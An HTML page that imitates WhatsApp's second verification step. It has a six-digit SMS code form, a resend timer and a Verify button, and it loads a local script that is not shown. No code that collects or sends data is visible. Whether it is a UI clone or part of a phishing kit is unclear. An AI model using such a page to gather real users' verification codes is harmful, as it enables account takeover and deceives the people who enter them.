<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification - Step 2</title>
    <link rel="stylesheet" href="static/style.css">
</head>
<body>

    <div class="wrapper">
        <!-- ================= STEP 2 VIEW ================= -->
        <div class="step-view active">
            <h2>Enter 6-digit code</h2>
            <div class="instructions">
                Waiting to automatically detect an SMS sent to <span class="phone-highlight" id="displayPhoneNumber">+234 812 345 6789</span>. 
                <a href="index.html" class="edit-link" id="editPhoneBtn">Wrong number?</a>
            </div>

            <!-- 6-Input Code Form Matrix -->
            <div class="otp-grid" id="otpForm">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" autofocus>
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
            </div>

            <div class="resend-container">
                <p>Didn't receive code?</p>
                <a href="#" class="resend-link disabled" id="resendBtn">Resend SMS</a> <span id="timerText">(2:00)</span>
            </div>
        </div>
    </div>

    <!-- Persistent Action Button -->
    <div class="action-container">
        <button class="btn-next" id="nextBtn" disabled>Verify</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
